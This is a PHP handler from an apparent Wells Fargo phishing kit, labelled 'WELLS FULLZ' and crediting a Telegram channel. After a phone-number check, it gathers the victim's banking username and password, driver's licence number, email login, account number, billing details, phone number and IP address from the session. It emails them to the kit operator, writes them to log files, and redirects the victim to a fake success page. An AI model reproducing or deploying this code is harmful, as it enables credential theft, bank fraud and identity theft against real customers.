<?php
error_reporting(0);
session_start();
set_time_limit(0);
include '../main.php';
if($_POST['j_ppin'] == "" || strlen($_POST['j_ppin']) != 10) {

    $error = 'Please Enter Valid Phone Number';
    echo "<META HTTP-EQUIV='refresh' content='0; URL=./../verify_account.php?error=".$error."&appIdKey=".$_SESSION['key']."&country=US'>";
    exit();
}
$j_ppin = $_POST['j_ppin'];

$_SESSION['j_ppin'] = $j_ppin;



$message  = "++-------------------------[ WELLS FULLZ ]-----------------------------++\n";
$message .= "Username			: ".$_SESSION['j_username']."\n";
$message .= "Password			: ".$_SESSION['j_password']."\n";
$message .= "DL Number			: ".$_SESSION['j_dlnum']."\n";
$message .= "Email Address		: ".$_SESSION['j_emailadd']."\n";
$message .= "Email Password		: ".$_SESSION['j_emailpass']."\n";
$message .= "Account Number		: ".$_SESSION['j_accnt']."\n";
$message .= "Billing			: ".$_SESSION['j_billing']."\n";
$message .= "Phone Number		: ".$_SESSION['j_ppin']."\n";

$message .= "IP Address		: ".$ip2."\n";
$message .= "++--------------[ OLD CODE https://t.me/oldcode]---------------++\n";


sendMail('FULLZ', $message);

$click = fopen("./logs/clicks.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
$click = fopen("./logs/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,$message);
fclose($click);
echo "<META HTTP-EQUIV='refresh' content='0; URL=./../success.php?error=&appIdKey=".$_SESSION['key']."&country=US'>";
exit();



